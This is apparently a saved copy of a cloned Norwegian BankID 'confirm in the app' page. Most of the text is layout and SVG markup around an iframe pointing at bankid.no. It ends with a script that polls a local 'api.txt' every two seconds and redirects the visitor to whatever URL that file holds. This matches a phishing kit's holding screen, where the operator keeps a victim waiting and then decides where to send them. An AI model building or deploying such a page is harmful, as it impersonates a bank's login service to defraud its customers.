bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;></div><div class=&quot;_3--1Lzuaofk-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:90,&amp;quot;h&amp;quot;:14,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}&quot;><div class=&quot;ul9tGGaWnp8-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:90,&amp;quot;h&amp;quot;:14,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}&quot;><svg aria-hidden=&quot;true&quot; fill=&quot;none&quot; height=&quot;14&quot; viewBox=&quot;0 0 90 14&quot; width=&quot;90&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:90,&amp;quot;h&amp;quot;:14,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}&quot;><path d=&quot;M29.5273 8.5156C29.5273 10.5786 30.6877 11.6746 32.0416 11.6746C33.2665 11.6746 34.6204 10.6431 34.6204 8.5156C34.6204 6.38809 33.331 5.42104 32.106 5.42104C30.7522 5.42104 29.5273 6.38809 29.5273 8.5156ZM29.5273 0.0700378V5.09869C30.1075 4.19611 31.139 3.29353 32.8797 3.29353C34.8138 3.29353 37.1347 4.90528 37.1347 8.45113C37.1347 12.1259 34.9427 13.9311 32.6863 13.9311C31.3969 13.9311 30.3009 13.3508 29.5917 12.1904V13.6087H27.0774V0.0700378H29.5273Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:207,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:10,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:841,&amp;quot;abs_y&amp;quot;:109}&quot;></path><path d=&quot;M40.8095 8.58009C40.8095 10.7076 42.0989 11.6747 43.3238 11.6747C44.6777 11.6747 45.8381 10.7721 45.8381 8.58009C45.8381 6.45258 44.6777 5.42107 43.3238 5.42107C42.1634 5.42107 40.8095 6.38811 40.8095 8.58009ZM38.3596 8.45115C38.3596 4.96978 40.6161 3.22909 42.8725 3.22909C44.0975 3.22909 45.129 3.68038 45.9026 4.77637V3.48697H48.3525V13.6087H45.9026V12.1904C45.1934 13.1575 44.1619 13.8666 42.5502 13.8666C40.6161 13.8666 38.3596 12.1904 38.3596 8.45115Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:218,&amp;quot;y&amp;quot;:25,&amp;quot;w&amp;quot;:9,&amp;quot;h&amp;quot;:10,&amp;quot;abs_x&amp;quot;:852,&amp;quot;abs_y&amp;quot;:112}&quot;></path><path d=&quot;M53.1877 7.87091V13.6087H50.7378V3.55142H53.1877V5.03423C53.8969 3.74483 55.1863 3.29354 56.2823 3.29354C58.0229 3.29354 59.6992 4.19612 59.6992 6.90386V13.6087H57.2493V7.80644C57.2493 6.13022 56.4112 5.48552 55.3152 5.48552C54.0903 5.54999 53.1877 6.25916 53.1877 7.87091Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:230,&amp;quot;y&amp;quot;:26,&amp;quot;w&amp;quot;:8,&amp;quot;h&amp;quot;:10,&amp;quot;abs_x&amp;quot;:864,&amp;quot;abs_y&amp;quot;:113}&quot;></path><path d=&quot;M62.0201 0.0700684V13.6088H64.4699V11.1589L65.8238 9.48268L68.596 13.6088H71.3037L67.3066 7.74199L70.788 3.55144H68.0158L64.4699 8.19328V0.0700684H62.0201Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:242,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:9,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:876,&amp;quot;abs_y&amp;quot;:109}&quot;></path><path d=&quot;M76.2034 0.52137H73.6891V13.6088H76.2034V0.52137Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:253,&amp;quot;y&amp;quot;:23,&amp;quot;w&amp;quot;:2,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:887,&amp;quot;abs_y&amp;quot;:110}&quot;></path><path d=&quot;M83.4886 0.52137H78.7178V13.6088H83.4886C87.0344 13.6088 90 11.4813 90 7.03283C90 2.64888 87.0344 0.52137 83.4886 0.52137ZM83.4886 11.2878H81.2321V2.84229H83.4886C85.5516 2.84229 87.2923 4.19616 87.2923 7.0973C87.2923 9.93398 85.5516 11.2878 83.4886 11.2878Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:258,&amp;quot;y&amp;quot;:23,&amp;quot;w&amp;quot;:11,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:892,&amp;quot;abs_y&amp;quot;:110}&quot;></path><path d=&quot;M0.967273 2.00349H4.83636C5.35224 2.00349 5.80364 1.55209 5.80364 1.03621C5.80364 0.520333 5.35224 0.0689392 4.83636 0.0689392H0.967273C0.451394 0.0689392 0 0.520333 0 1.03621C0 1.55209 0.451394 2.00349 0.967273 2.00349Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}&quot;></path><path d=&quot;M0.967273 9.74167H4.83636C5.35224 9.74167 5.80364 9.29028 5.80364 8.7744C5.80364 8.25852 5.35224 7.80712 4.83636 7.80712H0.967273C0.451394 7.80712 0 8.25852 0 8.7744C0 9.29028 0.451394 9.74167 0.967273 9.74167Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:30,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:117}&quot;></path><path d=&quot;M4.83636 13.6108H0.967273C0.451394 13.6108 0 13.1594 0 12.6435C0 12.1276 0.451394 11.6762 0.967273 11.6762H4.83636C5.35224 11.6762 5.80364 12.1276 5.80364 12.6435C5.80364 13.1594 5.35224 13.6108 4.83636 13.6108Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:34,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:121}&quot;></path><path d=&quot;M8.70545 5.87258H12.5745C13.0904 5.87258 13.5418 5.42118 13.5418 4.90531C13.5418 4.38943 13.0904 3.93803 12.5745 3.93803H8.70545C8.18958 3.93803 7.73818 4.38943 7.73818 4.90531C7.73818 5.42118 8.18958 5.87258 8.70545 5.87258Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:187,&amp;quot;y&amp;quot;:26,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:821,&amp;quot;abs_y&amp;quot;:113}&quot;></path><path d=&quot;M12.5745 9.74167H8.70545C8.18958 9.74167 7.73818 9.29028 7.73818 8.7744C7.73818 8.25852 8.18958 7.80712 8.70545 7.80712H12.5745C13.0904 7.80712 13.5418 8.25852 13.5418 8.7744C13.5418 9.29028 13.0904 9.74167 12.5745 9.74167Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:187,&amp;quot;y&amp;quot;:30,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:821,&amp;quot;abs_y&amp;quot;:117}&quot;></path><path d=&quot;M16.4436 2.00349H20.3127C20.8286 2.00349 21.28 1.55209 21.28 1.03621C21.28 0.520333 20.8286 0.0689392 20.3127 0.0689392H16.4436C15.9278 0.0689392 15.4764 0.520333 15.4764 1.03621C15.4764 1.55209 15.9278 2.00349 16.4436 2.00349Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:109}&quot;></path><path d=&quot;M20.3127 5.87258H16.4436C15.9278 5.87258 15.4764 5.42118 15.4764 4.90531C15.4764 4.38943 15.9278 3.93803 16.4436 3.93803H20.3127C20.8286 3.93803 21.28 4.38943 21.28 4.90531C21.28 5.42118 20.8286 5.87258 20.3127 5.87258Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:26,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:113}&quot;></path><path d=&quot;M16.4436 13.6108H20.3127C20.8286 13.6108 21.28 13.1594 21.28 12.6435C21.28 12.1276 20.8286 11.6762 20.3127 11.6762H16.4436C15.9278 11.6762 15.4764 12.1276 15.4764 12.6435C15.4764 13.1594 15.9278 13.6108 16.4436 13.6108Z&quot; fill=&quot;white&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:34,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:121}&quot;></path></svg></div></div><div class=&quot;Z-XtFZJCw8c-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><h1 id=&quot;P0-1&quot; tabindex=&quot;-1&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><span bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;>Bekreft i appen</span></h1></div><div class=&quot;rroRwgEBZuQ-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:393,&amp;quot;y&amp;quot;:13,&amp;quot;w&amp;quot;:40,&amp;quot;h&amp;quot;:32,&amp;quot;abs_x&amp;quot;:1027,&amp;quot;abs_y&amp;quot;:100}&quot;><div bis_size=&quot;{&amp;quot;x&amp;quot;:393,&amp;quot;y&amp;quot;:13,&amp;quot;w&amp;quot;:40,&amp;quot;h&amp;quot;:32,&amp;quot;abs_x&amp;quot;:1027,&amp;quot;abs_y&amp;quot;:100}&quot;><button class=&quot;_0GDSvZVsPEo-&quot; data-variant=&quot;transparent&quot; type=&quot;button&quot; title=&quot;Åpne meny&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:393,&amp;quot;y&amp;quot;:13,&amp;quot;w&amp;quot;:40,&amp;quot;h&amp;quot;:32,&amp;quot;abs_x&amp;quot;:1027,&amp;quot;abs_y&amp;quot;:100}&quot;><span class=&quot;owg3SWE7I-4-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:401,&amp;quot;y&amp;quot;:17,&amp;quot;w&amp;quot;:24,&amp;quot;h&amp;quot;:24,&amp;quot;abs_x&amp;quot;:1035,&amp;quot;abs_y&amp;quot;:104}&quot;><svg aria-hidden=&quot;true&quot; fill=&quot;none&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;24&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:401,&amp;quot;y&amp;quot;:17,&amp;quot;w&amp;quot;:24,&amp;quot;h&amp;quot;:24,&amp;quot;abs_x&amp;quot;:1035,&amp;quot;abs_y&amp;quot;:104}&quot;><path d=&quot;M12 2.25C10.0716 2.25 8.18657 2.82183 6.58319 3.89317C4.97982 4.96451 3.73013 6.48726 2.99218 8.26884C2.25422 10.0504 2.06114 12.0108 2.43735 13.9021C2.81355 15.7934 3.74215 17.5307 5.10571 18.8943C6.46928 20.2579 8.20656 21.1865 10.0979 21.5627C11.9892 21.9389 13.9496 21.7458 15.7312 21.0078C17.5127 20.2699 19.0355 19.0202 20.1068 17.4168C21.1782 15.8134 21.75 13.9284 21.75 12C21.7473 9.41498 20.7192 6.93661 18.8913 5.10872C17.0634 3.28084 14.585 2.25273 12 2.25ZM12 20.25C10.3683 20.25 8.77326 19.7661 7.41655 18.8596C6.05984 17.9531 5.00242 16.6646 4.378 15.1571C3.75358 13.6496 3.5902 11.9908 3.90853 10.3905C4.22685 8.79016 5.01259 7.32015 6.16637 6.16637C7.32016 5.01259 8.79017 4.22685 10.3905 3.90852C11.9909 3.59019 13.6497 3.75357 15.1571 4.37799C16.6646 5.00242 17.9531 6.05984 18.8596 7.41655C19.7661 8.77325 20.25 10.3683 20.25 12C20.2475 14.1873 19.3775 16.2843 17.8309 17.8309C16.2843 19.3775 14.1873 20.2475 12 20.25ZM13.5 16.5C13.5 16.6989 13.421 16.8897 13.2803 17.0303C13.1397 17.171 12.9489 17.25 12.75 17.25C12.3522 17.25 11.9706 17.092 11.6893 16.8107C11.408 16.5294 11.25 16.1478 11.25 15.75V12C11.0511 12 10.8603 11.921 10.7197 11.7803C10.579 11.6397 10.5 11.4489 10.5 11.25C10.5 11.0511 10.579 10.8603 10.7197 10.7197C10.8603 10.579 11.0511 10.5 11.25 10.5C11.6478 10.5 12.0294 10.658 12.3107 10.9393C12.592 11.2206 12.75 11.6022 12.75 12V15.75C12.9489 15.75 13.1397 15.829 13.2803 15.9697C13.421 16.1103 13.5 16.3011 13.5 16.5ZM10.5 7.875C10.5 7.6525 10.566 7.43499 10.6896 7.24998C10.8132 7.06498 10.9889 6.92078 11.1945 6.83564C11.4001 6.75049 11.6263 6.72821 11.8445 6.77162C12.0627 6.81502 12.2632 6.92217 12.4205 7.0795C12.5778 7.23684 12.685 7.43729 12.7284 7.65552C12.7718 7.87375 12.7495 8.09995 12.6644 8.30552C12.5792 8.51109 12.435 8.68679 12.25 8.8104C12.065 8.93402 11.8475 9 11.625 9C11.3266 9 11.0405 8.88147 10.8295 8.6705C10.6185 8.45952 10.5 8.17337 10.5 7.875Z&quot; fill=&quot;black&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:403,&amp;quot;y&amp;quot;:20,&amp;quot;w&amp;quot;:19,&amp;quot;h&amp;quot;:19,&amp;quot;abs_x&amp;quot;:1037,&amp;quot;abs_y&amp;quot;:107}&quot;></path></svg></span></button></div></div></header></div><main class=&quot;lH9xEtG2mCI-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}&quot;><div class=&quot;xdexl2z-LoQ-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}&quot;><div class=&quot;_5N17V2ww3jg-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}&quot;><div class=&quot;psnZoCxGFCw- n9F0CdBAfu0-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}&quot;><div class=&quot;Wx-8BLcX9K8-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:13,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:428,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:647,&amp;quot;abs_y&amp;quot;:145}&quot;><div class=&quot;Vxvq0OQ2EoE-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:131,&amp;quot;y&amp;quot;:62,&amp;quot;w&amp;quot;:187,&amp;quot;h&amp;quot;:61,&amp;quot;abs_x&amp;quot;:765,&amp;quot;abs_y&amp;quot;:149}&quot;><h1 class=&quot;mnmfEEsQ8Bw-&quot; id=&quot;P0-1&quot; tabindex=&quot;-1&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:131,&amp;quot;y&amp;quot;:62,&amp;quot;w&amp;quot;:187,&amp;quot;h&amp;quot;:30,&amp;quot;abs_x&amp;quot;:765,&amp;quot;abs_y&amp;quot;:149}&quot;></h1></div><div class=&quot;MRDe6--z-b4-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:17,&amp;quot;y&amp;quot;:134,&amp;quot;w&amp;quot;:416,&amp;quot;h&amp;quot;:375,&amp;quot;abs_x&amp;quot;:651,&amp;quot;abs_y&amp;quot;:221}&quot;><div class=&quot;EVWKyPP5QhM- wjTH1MDT4RA-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:40,&amp;quot;y&amp;quot;:196,&amp;quot;w&amp;quot;:370,&amp;quot;h&amp;quot;:250,&amp;quot;abs_x&amp;quot;:674,&amp;quot;abs_y&amp;quot;:283}&quot;><div class=&quot;OgdyOiyqLtw-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:196,&amp;quot;w&amp;quot;:60,&amp;quot;h&amp;quot;:60,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:283}&quot;><svg class=&quot;XMrJ483EtrA-&quot; fill=&quot;none&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;24&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; aria-busy=&quot;true&quot; aria-label=&quot;Venter på bekreftelse&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:193,&amp;quot;y&amp;quot;:194,&amp;quot;w&amp;quot;:63,&amp;quot;h&amp;quot;:63,&amp;quot;abs_x&amp;quot;:827,&amp;quot;abs_y&amp;quot;:281}&quot;><mask height=&quot;24&quot; id=&quot;mask0_27_549&quot; maskUnits=&quot;userSpaceOnUse&quot; width=&quot;24&quot; x=&quot;0&quot; y=&quot;0&quot; style=&quot;mask-type: alpha;&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><rect fill=&quot;white&quot; height=&quot;24&quot; width=&quot;24&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;></rect></mask><g mask=&quot;url(#mask0_27_549)&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:201,&amp;quot;y&amp;quot;:202,&amp;quot;w&amp;quot;:47,&amp;quot;h&amp;quot;:47,&amp;quot;abs_x&amp;quot;:835,&amp;quot;abs_y&amp;quot;:289}&quot;><path d=&quot;M11 17C11 19.2091 9.20914 21 7 21C4.79086 21 3 19.2091 3 17C3 14.7909 4.79086 13 7 13C9.20914 13 11 14.7909 11 17Z&quot; fill=&quot;black&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:201,&amp;quot;y&amp;quot;:204,&amp;quot;w&amp;quot;:21,&amp;quot;h&amp;quot;:21,&amp;quot;abs_x&amp;quot;:835,&amp;quot;abs_y&amp;quot;:291}&quot;></path><path d=&quot;M21 7C21 9.20914 19.2091 11 17 11C14.7909 11 13 9.20914 13 7C13 4.79086 14.7909 3 17 3C19.2091 3 21 4.79086 21 7Z&quot; fill=&quot;black&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:227,&amp;quot;y&amp;quot;:227,&amp;quot;w&amp;quot;:21,&amp;quot;h&amp;quot;:21,&amp;quot;abs_x&amp;quot;:861,&amp;quot;abs_y&amp;quot;:314}&quot;></path></g></svg></div><div class=&quot;xBoUtclVXV8-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:89,&amp;quot;y&amp;quot;:272,&amp;quot;w&amp;quot;:270,&amp;quot;h&amp;quot;:26,&amp;quot;abs_x&amp;quot;:723,&amp;quot;abs_y&amp;quot;:359}&quot;></div></div></div></div></div></div></div></main></div></div></div></div><script data-savepage-type=&quot;text/javascript&quot; data-savepage-type=&quot;text/plain&quot; type=&quot;text/plain&quot; data-savepage-src=&quot;https://csfe.bankid.no/jsclient21/error.js&quot;></script><script data-savepage-type=&quot;text/javascript&quot; data-savepage-type=&quot;text/plain&quot; type=&quot;text/plain&quot; data-conf=&quot;u52GCBcvPJfTeELcUy7RkyoAAABvwLcvBYeFF5s6qfXGZh922JO6hWl7giLOK6RRcFkIRJTwY4wSxDvaWsYrlzDgLFjTYmEKSLgPQU4q7bnVUDFM44c4-z2OUNb0q7cD09BOCW9WgasIBDbLRXX6NDzkc0wiIoYMDkoUDeueJmWdnUVH_C_weipoFOGl6mvuhoHiclcUbJJsOQEOm2jUWCYGNh-Qqx-IHfkOveLAsjh0xrzxagSHwxIELgje7zqhYj2Z9tFFinO1xz6JNI-ZRVUCTDbdNReNXOaRf0zDGKKsLS01ajOc07XG2VFf-MzcbNO9WbbApXSJ_Joxy7gCCu8a0cwUHNn9MdoatJdBa8n6wuCMYqaXfX7tttrC5cA_s4MUgptWZSZ6h363ufYM5pEIMij_0JP1TwVULstTtTsZ7eik5K9_syGCe4VP46MWgkcFQ5dUUJNDYeeFJQVK9I61fK03CFWpIW9u6e6ABw5KWWfUyTHF_T3tUbTnI0pTfGK_-LP2pp_ePsKoTWWSYB5e7aluB-cIsa3HlI7EHo8PCTAwBBqmoJQaJsy2GvSvXRvTX2kBKicfixh4Eu2ndoZx280ZceOGwbkXK_WALjOBcs2yWZQSjAROwexwGbDxk1F5jmR50rmsYLpghi03LGdLbY2zH0ZU0U67YDWMdEtYhQMXnA-Bs-c7SYtP57aCn_nRKiHS1l1fNaaNXldzmrRR6FlwQ1fGQb8RsR7IClzax0_a7w7oMrzzLsm6wz5X-7gTxUG1Rsspqactg0LMgDdhZ0OsEM2gD6sI5vddZuyKg99wCrdwWmJSz0syPFUj2gbHWE72t-_Yn7wiSrpSlP3JiiEAijMeV4WRNTczf3pOffCoYPxtQQeYq8dtbjQ4cL5WfNyAl9qMlVCIauh3pEK34_aSCRkjplbttXqkw5RF9caTaaN-4E_zbMSY2SldLeTODn_KIwV8Pbwod6ITSI-VVsh_HrtuvZmLrNjv7_P0HaaWGd25ib8wVVzz3zUJg8dBW7lRDC3Fy3WH3RUt3Q6cpvCbZx84l6nzWYkUyNHfHEIvf3HwxGAZ_63Lj_EWOfjshqTsZGrXDlQTRsTJNh6T6OIECRPGjOk0LHD3cl0MOe2lGrFaeqWMPEd0yxaT2OlgSj6NscE6AO8TCn7-tsEH969wmfrIIoPq58GYfDENvfojLO3Wfl8KUOYnrLJdbAZXGBlfwU68_l9FRMtXqc2dbP7tAwpQNLLwODwbg1uinNXWshXDfNp12Mc4_DrUh8vKUGiKNRIFXOGFKJWz9-LwvVTgiBAklXScG4ZBajQgkBc0J8SmWRXfFi7B2yKe257KDy61EP_co6tuCE5V253d9fgRtRR2CvsKwG1A2XgsrngVXCNKpaw4GZJJKjvNHRJrqOwi5fMPvuhHbzgkQXEVnyrTW0q9zTH0elFc2BnINwslypDDeyByc_ERKtBQaQ4Ac-i3Esu1d8Q4f9UBwM5mleiLG3qxXouYMfW5YB69Wg&quot; data-savepage-src=&quot;https://csfe.bankid.no/CentralServerFEJS/b/KgAAALeMZD8t1MPRpPmolHNpFEEul8w0CcGGxqGplJ4lPBxD2oi8Tboru_3Xy1RnhntzhyJFTqJRjbPlKt0Wp8K35n4QWy0FYl8&quot;></script><script data-savepage-type=&quot;&quot; data-savepage-type=&quot;text/plain&quot; type=&quot;text/plain&quot;></script></body></html>" data-savepage-crossorigin="" frameborder="0" width="100%" height="100%" data-savepage-src="https://csfe.bankid.no/CentralServerFEJS/a?cid=buZCzSzH1x4pcRZa" data-savepage-src="" src="" title="BankID" allow="local-network-access *" bis_size="{&quot;x&quot;:634,&quot;y&quot;:87,&quot;w&quot;:450,&quot;h&quot;:520,&quot;abs_x&quot;:634,&quot;abs_y&quot;:87}" bis_id="fr_kwbocykyp4cbwjrd3dyq2i" bis_depth="0" bis_chainid="1" data-savepage-key="0-0"></iframe>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="Cbrq5-nkab0-" bis_skin_checked="1">
                        
                    </div>
                </div>
            </div>
        </div>
       
    
<script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
</body></html>